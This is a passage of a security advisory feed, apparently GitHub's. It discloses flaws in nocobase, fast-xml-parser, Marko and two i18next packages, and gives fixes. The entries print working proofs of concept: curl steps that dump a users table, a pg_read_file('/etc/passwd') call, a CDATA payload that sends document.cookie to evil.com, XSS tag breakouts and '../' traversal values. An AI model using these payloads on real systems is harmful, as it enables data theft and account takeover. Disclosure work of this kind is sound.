    </entry>
    <entry>
        <title type="html"><![CDATA[[@nocobase/plugin-collection-sql] @nocobase/plugin-collection-sql: SQL Validation Bypass Through Missing `checkSQL` Call]]></title>
        <id>https://github.com/advisories/GHSA-wrwh-c28m-9jjh</id>
        <link href="https://github.com/advisories/GHSA-wrwh-c28m-9jjh"/>
        <updated>2026-04-22T20:07:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>checkSQL()</code> validation function that blocks dangerous SQL keywords (e.g., <code>pg_read_file</code>, <code>LOAD_FILE</code>, <code>dblink</code>) is applied on the <code>collections:create</code> and <code>sqlCollection:execute</code> endpoints but is entirely missing on the <code>sqlCollection:update</code> endpoint. An attacker with collection management permissions can create a SQL collection with benign SQL, then update it with arbitrary SQL that bypasses all validation, and query the collection to execute the injected SQL and exfiltrate data.</p>
<p><strong>Affected component:</strong> <code>@nocobase/plugin-collection-sql</code>
<strong>Affected versions:</strong> &lt;= 2.0.32 (confirmed)
<strong>Minimum privilege:</strong> Collection management permissions (<code>pm.data-source-manager.collection-sql</code> snippet)</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<h3 id="checksql-is-applied-on-create-and-execute"><code>checkSQL</code> is applied on create and execute</h3>
<p><code>packages/plugins/@nocobase/plugin-collection-sql/src/server/resources/sql.ts</code></p>
<pre><code class="language-javascript">// Line 51-60 — execute action: checkSQL IS called
execute: async (ctx: Context, next: Next) =&gt; {
    const { sql } = ctx.action.params.values || {};
    try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }
    // ...
}
</code></pre>
<h3 id="checksql-is-not-applied-on-update"><code>checkSQL</code> is NOT applied on update</h3>
<pre><code class="language-javascript">// Line 105-118 — update action: checkSQL IS NOT called
update: async (ctx: Context, next: Next) =&gt; {
    const transaction = await ctx.app.db.sequelize.transaction();
    try {
        const { upRes } = await updateCollection(ctx, transaction);
        // No checkSQL() call anywhere in this path!
        const [collection] = upRes;
        await collection.load({ transaction, resetFields: true });
        await transaction.commit();
    }
    // ...
}
</code></pre>
<h3 id="the-checksql-function-itself">The <code>checkSQL</code> function itself</h3>
<p><code>packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts:10-28</code></p>
<pre><code class="language-javascript">export const checkSQL = (sql: string) =&gt; {
  const dangerKeywords = [
    'pg_read_file', 'pg_write_file', 'pg_ls_dir', 'LOAD_FILE',
    'INTO OUTFILE', 'INTO DUMPFILE', 'dblink', 'lo_import', // ...
  ];
  sql = sql.trim().split(';').shift();
  if (!/^select/i.test(sql) &amp;&amp; !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
    throw new Error('Only supports SELECT statements or WITH clauses');
  }
  if (dangerKeywords.some((keyword) =&gt; sql.toLowerCase().includes(keyword.toLowerCase()))) {
    throw new Error('SQL statements contain dangerous keywords');
  }
};
</code></pre>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash">TOKEN="&lt;admin_jwt_token&gt;"

# Step 1: Create collection with valid SQL (passes checkSQL)
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "exfil_collection",
    "sql": "SELECT 1 as id",
    "fields": [{"name": "id", "type": "integer"}],
    "template": "sql"
  }'

# Step 2: Verify checkSQL blocks dangerous SQL on create
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "blocked", "sql": "SELECT pg_read_file('\''/etc/passwd'\'')", "fields": [], "template": "sql"}'
# Returns: 400 "SQL statements contain dangerous keywords"

# Step 3: Update with dangerous SQL — bypasses checkSQL entirely
curl -s "http://TARGET:13000/api/sqlCollection:update?filterByTk=exfil_collection" \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "sql": "SELECT * FROM users",
    "fields": [
      {"name": "id", "type": "integer"},
      {"name": "email", "type": "string"},
      {"name": "password", "type": "string"}
    ]
  }'
# Returns: 200 OK — no validation!

# Step 4: Query the collection to exfiltrate data
curl -s "http://TARGET:13000/api/exfil_collection:list" \
  -H "Authorization: Bearer $TOKEN"
# Returns: all rows from users table including password hashes
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Confidentiality:</strong> Arbitrary <code>SELECT</code> queries exfiltrate any table. Confirmed dump of the <code>users</code> table including password hashes.</li>
<li><strong>Integrity/Availability:</strong> Although <code>checkSQL</code> strips after the first semicolon, dangerous single-statement operations like <code>SELECT ... INTO</code>, subqueries with side effects, or database-specific functions (<code>pg_read_file</code>, <code>LOAD_FILE</code>, <code>dblink</code>) are all accessible through the update bypass.</li>
<li><strong>Privilege escalation:</strong> On PostgreSQL, <code>dblink</code> enables lateral movement to other databases. <code>pg_read_file</code> reads arbitrary files from the database server filesystem.</li>
</ul>
<h2 id="fix-suggestion">Fix Suggestion</h2>
<ol>
<li><p><strong>Add <code>checkSQL()</code> to the <code>update</code> action.</strong> The one-line fix:</p>
<pre><code class="language-javascript">update: async (ctx: Context, next: Next) =&gt; {
    const { sql } = ctx.action.params.values || {};
    if (sql) {
        try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }
    }
    // ... existing code ...
}
</code></pre>
</li>
<li><p><strong>Centralize validation in middleware</strong> rather than per-action. Apply <code>checkSQL</code> in the resource middleware for any action that accepts a <code>sql</code> field, so future actions cannot accidentally skip it.</p>
</li>
<li><p><strong>Strengthen the blocklist.</strong> The current list is missing <code>COPY</code> (PostgreSQL file I/O and RCE), <code>CREATE</code>, <code>ALTER</code>, <code>DROP</code>, <code>GRANT</code>, <code>SET</code>, and <code>EXECUTE</code>. Consider switching to a parser-based allowlist that only permits <code>SELECT</code> and <code>WITH ... SELECT</code> at the AST level rather than relying on keyword blocklisting.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocobase/nocobase/security/advisories/GHSA-wrwh-c28m-9jjh">https://github.com/nocobase/nocobase/security/advisories/GHSA-wrwh-c28m-9jjh</a></li>
<li><a href="https://github.com/nocobase/nocobase/pull/9134">https://github.com/nocobase/nocobase/pull/9134</a></li>
<li><a href="https://github.com/nocobase/nocobase/commit/851aee543efa894142e0f7be03eb55d9cec06a91">https://github.com/nocobase/nocobase/commit/851aee543efa894142e0f7be03eb55d9cec06a91</a></li>
<li><a href="https://github.com/advisories/GHSA-wrwh-c28m-9jjh">https://github.com/advisories/GHSA-wrwh-c28m-9jjh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrwh-c28m-9jjh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T20:07:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-xml-parser] fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters]]></title>
        <id>https://github.com/advisories/GHSA-gh4j-gqv2-49f6</id>
        <link href="https://github.com/advisories/GHSA-gh4j-gqv2-49f6"/>
        <updated>2026-04-22T20:04:18.000Z</updated>
        <content type="html"><![CDATA[<h1 id="fast-xml-parser-xmlbuilder-comment-and-cdata-injection-via-unescaped-delimiters">fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters</h1>
<h2 id="summary">Summary</h2>
<p>fast-xml-parser XMLBuilder does not escape the <code>--&gt;</code> sequence in comment content or the <code>]]&gt;</code> sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.</p>
<p>Existing CVEs for fast-xml-parser cover different issues:</p>
<ul>
<li>CVE-2023-26920: Prototype pollution (parser)</li>
<li>CVE-2023-34104: ReDoS (parser)</li>
<li>CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder</li>
<li>CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities</li>
</ul>
<p>This finding covers <strong>unescaped comment/CDATA delimiters in XMLBuilder</strong> - a distinct vulnerability.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<p><strong>File</strong>: <code>src/fxb.js</code></p>
<pre><code class="language-javascript">// Line 442 - Comment building with NO escaping of --&gt;
buildTextValNode(val, key, attrStr, level) {
    // ...
    if (key === this.options.commentPropName) {
        return this.indentate(level) + `&lt;!--${val}--&gt;` + this.newLine;  // VULNERABLE
    }
    // ...
    if (key === this.options.cdataPropName) {
        return this.indentate(level) + `&lt;![CDATA[${val}]]&gt;` + this.newLine;  // VULNERABLE
    }
}
</code></pre>
<p>Compare with attribute/text escaping which IS properly handled via <code>replaceEntitiesValue()</code>.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="test-1-comment-injection-xss-in-svghtml-context">Test 1: Comment Injection (XSS in SVG/HTML context)</h3>
<pre><code class="language-javascript">import { XMLBuilder } from 'fast-xml-parser';

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true,
  suppressEmptyNode: true
});

const xml = {
  root: {
    "#comment": "--&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;!--",
    data: "legitimate content"
  }
};

console.log(builder.build(xml));
</code></pre>
<p><strong>Output</strong>:</p>
<pre><code class="language-xml">&lt;root&gt;
  &lt;!----&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;!----&gt;
  &lt;data&gt;legitimate content&lt;/data&gt;
&lt;/root&gt;
</code></pre>
<h3 id="test-2-cdata-injection-rss-feed">Test 2: CDATA Injection (RSS feed)</h3>
<pre><code class="language-javascript">const builder = new XMLBuilder({
  cdataPropName: "#cdata",
  format: true,
  suppressEmptyNode: true
});

const rss = {
  rss: { channel: { item: {
    title: "Article",
    description: {
      "#cdata": "Content]]&gt;&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;&lt;![CDATA[more"
    }
  }}}
};

console.log(builder.build(rss));
</code></pre>
<p><strong>Output</strong>:</p>
<pre><code class="language-xml">&lt;rss&gt;
  &lt;channel&gt;
    &lt;item&gt;
      &lt;title&gt;Article&lt;/title&gt;
      &lt;description&gt;
        &lt;![CDATA[Content]]&gt;&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;&lt;![CDATA[more]]&gt;
      &lt;/description&gt;
    &lt;/item&gt;
  &lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h3 id="test-3-soap-message-injection">Test 3: SOAP Message Injection</h3>
<pre><code class="language-javascript">const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true
});

const soap = {
  "soap:Envelope": {
    "soap:Body": {
      "#comment": "Request from user: --&gt;&lt;soap:Body&gt;&lt;Action&gt;deleteAll&lt;/Action&gt;&lt;/soap:Body&gt;&lt;!--",
      Action: "getBalance",
      UserId: "12345"
    }
  }
};

console.log(builder.build(soap));
</code></pre>
<p><strong>Output</strong>:</p>
<pre><code class="language-xml">&lt;soap:Envelope&gt;
  &lt;soap:Body&gt;
    &lt;!--Request from user: --&gt;&lt;soap:Body&gt;&lt;Action&gt;deleteAll&lt;/Action&gt;&lt;/soap:Body&gt;&lt;!----&gt;
    &lt;Action&gt;getBalance&lt;/Action&gt;
    &lt;UserId&gt;12345&lt;/UserId&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre>
<p>The injected <code>&lt;Action&gt;deleteAll&lt;/Action&gt;</code> appears as a real SOAP action element.</p>
<h2 id="tested-output">Tested Output</h2>
<p>All tests run on Node.js v22, fast-xml-parser v5.5.12:</p>
<pre><code>1. COMMENT INJECTION:
   Injection successful: true

2. CDATA INJECTION (RSS feed scenario):
   Injection successful: true

4. Round-trip test:
   Injection present: true

5. SOAP MESSAGE INJECTION:
   Contains injected Action: true
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:</p>
<ol>
<li><strong>XSS</strong>: Inject <code>&lt;script&gt;</code> tags into XML/SVG/HTML documents served to browsers</li>
<li><strong>SOAP injection</strong>: Modify SOAP message structure by injecting XML elements</li>
<li><strong>RSS/Atom feed poisoning</strong>: Inject scripts into RSS feed items via CDATA breakout</li>
<li><strong>XML document manipulation</strong>: Break XML structure by escaping comment/CDATA context</li>
</ol>
<p>This is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Escape delimiters in comment and CDATA content:</p>
<pre><code class="language-javascript">// For comments: replace -- with escaped equivalent
if (key === this.options.commentPropName) {
    const safeVal = String(val).replace(/--/g, '&amp;#45;&amp;#45;');
    return this.indentate(level) + `&lt;!--${safeVal}--&gt;` + this.newLine;
}

// For CDATA: split on ]]&gt; and rejoin with separate CDATA sections
if (key === this.options.cdataPropName) {
    const safeVal = String(val).replace(/]]&gt;/g, ']]]]&gt;&lt;![CDATA[&gt;');
    return this.indentate(level) + `&lt;![CDATA[${safeVal}]]&gt;` + this.newLine;
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6">https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6</a></li>
<li><a href="https://github.com/advisories/GHSA-gh4j-gqv2-49f6">https://github.com/advisories/GHSA-gh4j-gqv2-49f6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh4j-gqv2-49f6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T20:04:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@marko/runtime-tags] Marko: XSS via case-insensitive script/style closing tag bypass in runtime HTML escaping]]></title>
        <id>https://github.com/advisories/GHSA-x9fj-57fh-c8wq</id>
        <link href="https://github.com/advisories/GHSA-x9fj-57fh-c8wq"/>
        <updated>2026-04-22T19:55:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When dynamic text is interpolated into a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> tag the Marko runtime failed to prevent tag breakout when the closing tag used non-lowercase casing.
An attacker able to place input inside a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> block could break out of the tag with <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/Style&gt;</code>, etc. and inject arbitrary HTML/JavaScript, resulting in cross-site scripting.</p>
<h3 id="details">Details</h3>
<p>The affected helpers used case-sensitive regular expressions to detect attempts at closing the surrounding tag:</p>
<pre><code class="language-js">// packages/runtime-tags/src/html/content.ts
const unsafeScriptReg = /&lt;\/script/g;
const unsafeStyleReg  = /&lt;\/style/g;

// packages/runtime-class/src/runtime/html/helpers/escape-script-placeholder.js
const unsafeCharsReg = /&lt;\/script/g;

// packages/runtime-class/src/runtime/html/helpers/escape-style-placeholder.js
const unsafeCharsReg = /&lt;\/style/g;
</code></pre>
<p>HTML tag names are case-insensitive in the browser parser, so inputs such as <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/Script&gt;</code>, or <code>&lt;/sTyLe&gt;</code> were not matched by these regexes and passed through the helpers unchanged. A browser rendering the output treats the mixed-case end tag as a valid closing tag, terminating the script or style context, and then parses anything that follows as HTML.</p>
<p>The Marko compiler routes interpolated values inside <code>&lt;script&gt;</code> and <code>&lt;style&gt;</code> tags through these helpers automatically (see <code>native-tag.ts:1080-1085</code>), so application code following the framework's conventions had no way to detect or compensate for the gap.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-marko">$ const userCode = "&lt;/SCRIPT&gt;&lt;script&gt;alert(1)//";
&lt;script&gt;
  const data = ${JSON.stringify(userCode)};
&lt;/script&gt;
</code></pre>
<p>Would yield the following:</p>
<pre><code class="language-html">&lt;script&gt;const data = "&lt;/SCRIPT&gt;&lt;script&gt;alert(1)//";&lt;/script&gt;
</code></pre>
<p>Which is then parsed in any WHATWG-compliant browser as:</p>
<pre><code class="language-html">&lt;script&gt;const data = "&lt;/script&gt;
&lt;script&gt;alert(1)//";&lt;/script&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Cross-site scripting. Any Marko template that explicitly interpolates untrusted data inside a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> block is affected.</p>
<p>Stored XSS is trivial if the value originates from any persisted user input (username, profile bio, comment body, etc.) that is later embedded in a script tag during rendering. Exploitation yields arbitrary JavaScript execution in the victim's browser, enabling session token theft, account takeover, and arbitrary actions as the victim.</p>
<p>Since the internal <code>_escape_script</code> and <code>_escape_style</code> helpers are the framework's designated defense against script/style tag breakout, applications following standard Marko patterns had no obvious reason to add a second layer of sanitization.</p>
<p>This does not affect scripts or hydration state serialized by Marko itself — only templates that explicitly interpolate untrusted values inside a </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9fj-57fh-c8wq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T19:55:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[marko] Marko: XSS via case-insensitive script/style closing tag bypass in runtime HTML escaping]]></title>
        <id>https://github.com/advisories/GHSA-x9fj-57fh-c8wq</id>
        <link href="https://github.com/advisories/GHSA-x9fj-57fh-c8wq"/>
        <updated>2026-04-22T19:55:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When dynamic text is interpolated into a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> tag the Marko runtime failed to prevent tag breakout when the closing tag used non-lowercase casing.
An attacker able to place input inside a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> block could break out of the tag with <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/Style&gt;</code>, etc. and inject arbitrary HTML/JavaScript, resulting in cross-site scripting.</p>
<h3 id="details">Details</h3>
<p>The affected helpers used case-sensitive regular expressions to detect attempts at closing the surrounding tag:</p>
<pre><code class="language-js">// packages/runtime-tags/src/html/content.ts
const unsafeScriptReg = /&lt;\/script/g;
const unsafeStyleReg  = /&lt;\/style/g;

// packages/runtime-class/src/runtime/html/helpers/escape-script-placeholder.js
const unsafeCharsReg = /&lt;\/script/g;

// packages/runtime-class/src/runtime/html/helpers/escape-style-placeholder.js
const unsafeCharsReg = /&lt;\/style/g;
</code></pre>
<p>HTML tag names are case-insensitive in the browser parser, so inputs such as <code>&lt;/SCRIPT&gt;</code>, <code>&lt;/Script&gt;</code>, or <code>&lt;/sTyLe&gt;</code> were not matched by these regexes and passed through the helpers unchanged. A browser rendering the output treats the mixed-case end tag as a valid closing tag, terminating the script or style context, and then parses anything that follows as HTML.</p>
<p>The Marko compiler routes interpolated values inside <code>&lt;script&gt;</code> and <code>&lt;style&gt;</code> tags through these helpers automatically (see <code>native-tag.ts:1080-1085</code>), so application code following the framework's conventions had no way to detect or compensate for the gap.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-marko">$ const userCode = "&lt;/SCRIPT&gt;&lt;script&gt;alert(1)//";
&lt;script&gt;
  const data = ${JSON.stringify(userCode)};
&lt;/script&gt;
</code></pre>
<p>Would yield the following:</p>
<pre><code class="language-html">&lt;script&gt;const data = "&lt;/SCRIPT&gt;&lt;script&gt;alert(1)//";&lt;/script&gt;
</code></pre>
<p>Which is then parsed in any WHATWG-compliant browser as:</p>
<pre><code class="language-html">&lt;script&gt;const data = "&lt;/script&gt;
&lt;script&gt;alert(1)//";&lt;/script&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Cross-site scripting. Any Marko template that explicitly interpolates untrusted data inside a <code>&lt;script&gt;</code> or <code>&lt;style&gt;</code> block is affected.</p>
<p>Stored XSS is trivial if the value originates from any persisted user input (username, profile bio, comment body, etc.) that is later embedded in a script tag during rendering. Exploitation yields arbitrary JavaScript execution in the victim's browser, enabling session token theft, account takeover, and arbitrary actions as the victim.</p>
<p>Since the internal <code>_escape_script</code> and <code>_escape_style</code> helpers are the framework's designated defense against script/style tag breakout, applications following standard Marko patterns had no obvious reason to add a second layer of sanitization.</p>
<p>This does not affect scripts or hydration state serialized by Marko itself — only templates that explicitly interpolate untrusted values inside a </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9fj-57fh-c8wq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T19:55:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[i18next-fs-backend] i18next-fs-backend: Path traversal via unsanitised lng/ns allows arbitrary file read/overwrite]]></title>
        <id>https://github.com/advisories/GHSA-8847-338w-5hcj</id>
        <link href="https://github.com/advisories/GHSA-8847-338w-5hcj"/>
        <updated>2026-04-22T17:43:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions of <code>i18next-fs-backend</code> prior to 2.6.4 interpolate the caller-supplied <code>lng</code> and <code>ns</code> values directly into the configured <code>loadPath</code> and <code>addPath</code> templates with no path-component validation and no sanitisation. When an application exposes the resolved language code to user-controlled input (<code>?lng=</code> query parameter, cookie, request header), a crafted value can break out of the intended locale directory.</p>
<p>Affected call sites in <code>lib/index.js</code>:</p>
<ul>
<li><code>read</code> (line 38 pre-patch): <code>const filename = interpolate(loadPath, { lng: language, ns: namespace })</code></li>
<li><code>removeFile</code> (line 101 pre-patch): same pattern against <code>addPath</code></li>
<li><code>writeFile</code> (line 127 pre-patch): same pattern against <code>addPath</code> for queued missing-key writes</li>
</ul>
<p>The helper <code>interpolate</code> in <code>lib/utils.js</code> substitutes raw values with no encoding — unlike the <code>addQueryString</code> helper in <code>i18next-http-backend</code>, there is no equivalent safety for path interpolation.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Arbitrary file read.</strong> With a <code>loadPath</code> like <code>/locales/{{lng}}/{{ns}}.json</code>, an attacker-controlled <code>lng = '../../etc'</code> (and matching <code>ns</code>) causes the backend to read a file outside the locale directory. For parsers that tolerate arbitrary content (YAML's freeform text), the file contents surface as a translation resource.</li>
<li><strong>Arbitrary file overwrite.</strong> <code>addPath</code> is interpolated the same way for missing-key writes (the <code>create()</code> code path and the debounced writer in <code>writeFile</code>). A traversing <code>lng</code>/<code>ns</code> combination can cause the process to write JSON structures to an unintended filesystem location, potentially overwriting application files if the process user has write access.</li>
<li><strong>Chain with <code>.js</code>/<code>.ts</code> eval.</strong> <code>i18next-fs-backend</code> supports loading <code>.js</code> and <code>.ts</code> locale files by <code>eval</code>-ing their content (intentional feature, documented as requiring trusted sources). Combining traversal with that path — for example <code>lng = '../../../app/config'</code> against <code>loadPath: '/locales/{{lng}}/{{ns}}.js'</code> — would cause the backend to <strong>execute</strong> a server-side file as JavaScript, exfiltrating whatever it can touch (<code>process.env</code>, connected services).</li>
</ul>
<p>Exploitation requires the application to pass an untrusted <code>lng</code>/<code>ns</code> value through to <code>i18next.t()</code> without its own validation. Many i18next setups do exactly this via <code>i18next-browser-languagedetector</code> (query string / cookie detection).</p>
<h3 id="affected-versions">Affected versions</h3>
<p>All versions of <code>i18next-fs-backend</code> prior to <strong>2.6.4</strong>.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>2.6.4</strong>. <code>lib/utils.js</code> now exports:</p>
<ul>
<li><code>isSafePathSegment(v)</code> — returns <code>true</code> only if <code>v</code> is a non-empty string of ≤ 128 chars that does not contain <code>..</code>, <code>/</code>, <code>\</code>, control characters, or a prototype key (<code>__proto__</code>, <code>constructor</code>, <code>prototype</code>). Legitimate i18next language-code shapes (BCP-47, <code>en_US</code>, <code>zh-Hant-HK</code>, <code>pirate-speak</code>, <code>my-custom.ns</code>, <code>+</code>-joined multi-language values) all pass.</li>
<li><code>interpolatePath(template, data)</code> — substitutes variables like the existing <code>interpolate</code> but refuses the whole result if any segment fails <code>isSafePathSegment</code>. Callers bail out with an error (<code>read</code>) or silently drop the queued write (<code>writeFile</code>, <code>removeFile</code>).</li>
</ul>
<p>The <code>.js</code> / <code>.ts</code> <code>eval</code> behaviour is intentionally retained — dynamic expressions in locale files are a documented feature of this backend, and safe replacements like dynamic <code>import()</code> are async-only and incompatible with this backend's sync-capable code path. The README has a new "Security considerations" section that spells out the trust model: <code>.js</code>/<code>.ts</code> locale files must be treated as code.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround short of upgrading. If you cannot upgrade immediately, sanitise <code>lng</code> / <code>ns</code> at your application boundary before passing them to i18next — reject values containing <code>..</code>, <code>/</code>, <code>\</code>, control characters, and cap the length.</p>
<h3 id="credits">Credits</h3>
<p>Discovered via an internal security audit of the i18next ecosystem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/i18next/i18next-fs-backend/security/advisories/GHSA-8847-338w-5hcj">https://github.com/i18next/i18next-fs-backend/security/advisories/GHSA-8847-338w-5hcj</a></li>
<li><a href="https://github.com/advisories/GHSA-8847-338w-5hcj">https://github.com/advisories/GHSA-8847-338w-5hcj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8847-338w-5hcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-22T17:43:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[i18nextify] i18nextify has DOM XSS via javascript:/data: URL schemes in translated href/src attributes]]></title>
        <id>https://github.com/advisories/GHSA-6457-mxpq-4fqq</id>
        <link href="https://github.com/advisories/GHSA-6457-mxpq-4fqq"/>
        <updated>2026-04-22T17:42:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions of <code>i18nextify</code> prior to 4.0.8 substitute <code>{{key}}</code> interpolation tokens inside <code>src</code> and <code>href</code> attribute values with the raw string returned by <code>i18next.t()</code>. The substitution logic in <code>src/localize.js</code> (<code>replaceInside</code> handler around line 122) only guards against a duplicated <code>http://</code> origin prefix — it does not validate the URL scheme of the substituted value. A translated value such as <code>javascript:alert(1)</code> or <code>data:text/html,&lt;script&gt;...&lt;/script&gt;</code> is applied unchanged to the live DOM attribute.</p>
<h3 id="impact">Impact</h3>
<p>When an attacker can influence the content of a translation file or the translation-backend response — compromised translation CDN, user-contributed locales, MITM on a plain-HTTP backend, write access to the translation JSON — they can:</p>
<ul>
<li>Set any <code>href</code> on an anchor to a <code>javascript:</code> URI, executing arbitrary JavaScript when the victim clicks the link.</li>
<li>Set any <code>src</code> on <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, or <code>&lt;embed&gt;</code> to a <code>data:text/html</code> URI containing a full script payload that runs in the page's origin.</li>
<li>Use <code>vbscript:</code> on legacy IE installations or <code>file:</code> for local-resource navigation attacks.</li>
</ul>
<p>This path is distinct from the general i18nextify design that intentionally renders HTML from translations — href/src schemes are narrow and attack-specific, and no legitimate translation needs <code>javascript:</code> or <code>data:</code>. The fix therefore blocks these schemes outright without changing other behaviour.</p>
<h3 id="also-fixed-in-408">Also fixed in 4.0.8</h3>
<ul>
<li><strong><code>debug</code> / <code>saveMissing</code> URL-parameter substring match.</strong> The previous detection <code>window.location.search.indexOf('debug=true') &gt; -1</code> matched the substring anywhere in the query string. A URL like <code>?nosaveMissing=true</code> silently enabled <code>saveMissing</code> mode, causing the victim's browser to POST every unknown translation key to the configured <code>addPath</code> — a form of CSRF-style abuse of missing-key reporting. <code>?track_debug=true</code> enabled verbose debug logging, leaking i18next internals to the console. Now uses <code>URLSearchParams</code> for exact parameter matching.</li>
<li><strong>Optional <code>sanitize(html, ctx)</code> hook.</strong> The library's core purpose is to render HTML from translations — a behaviour that is safe only when the translation source is fully trusted. Applications with partially-trusted sources (user-contributed locales, third-party CDN, MITM-exposed HTTP backend) can now wire a sanitizer (e.g. DOMPurify) via <code>i18next.options.sanitize</code>. Defaults to pass-through to preserve existing behaviour for the main use case.</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>All versions of <code>i18nextify</code> prior to <strong>4.0.8</strong>.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>4.0.8</strong>. The URL-scheme blocklist is <code>^\s*(javascript|data|vbscript|file)\s*:</code> (case-insensitive) applied to each translated value before it is joined back into the <code>href</code>/<code>src</code> attribute. Values matching the blocklist are replaced with an empty string so the attribute becomes harmless rather than leaving the attacker's URL in place.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround short of upgrading. If you cannot upgrade immediately, audit every translation file for <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code>, and <code>file:</code> prefixes in any value that may reach an <code>href</code>/<code>src</code> position, and restrict translation-file write access to trusted operators. Serving translations over HTTPS and pinning the translation backend to an internal origin reduce the MITM surface.</p>
<h3 id="credits">Credits</h3>
<p>Discovered via an internal security audit of the i18next ecosystem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/i18next/i18nextify/security/advisories/GHSA-6457-mxpq-4fqq">https://github.com/i18next/i18nextify/security/advisories/GHSA-6457-mxpq-4fqq</a></li>
<li><a href="https://github.com/advisories/GHSA-6457-mxpq-4fqq">https://github.com/advisories/GHSA-6457-mxpq-4fqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6457-mxpq-4fqq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-22T17:42:24.000Z</published>
    </entry>
    <entry>
